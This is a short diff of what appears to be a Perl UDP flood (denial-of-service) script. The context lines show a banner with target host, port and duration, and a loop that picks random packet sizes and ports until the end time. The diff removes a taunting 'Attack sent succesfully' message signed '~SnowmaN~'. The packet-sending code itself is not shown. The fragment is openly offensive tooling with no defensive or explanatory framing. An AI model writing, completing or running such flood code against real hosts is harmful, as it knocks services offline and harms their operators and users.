@@ -38,12 +38,6 @@ print <<EOTEXT;
 \033[2;34m           \033[2;34mhost: \033[1;35m$ip\033[2;34m port: \033[1;35m$port\033[2;34m time: \033[1;35m$time\033[0m
 EOTEXT
 ;
-
-print "Attack sent succesfully to $ip " . ($port ? $port : "random") . " Disrespected = " .
-  ($size ? "$size-byte" : "Disconnected :)") . " ~SnowmaN~ " .
-  ($time ? " for $time seconds" : "") . "\n";
-print "Break with Ctrl-C\n" unless $time;
-
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(1500000))+1;
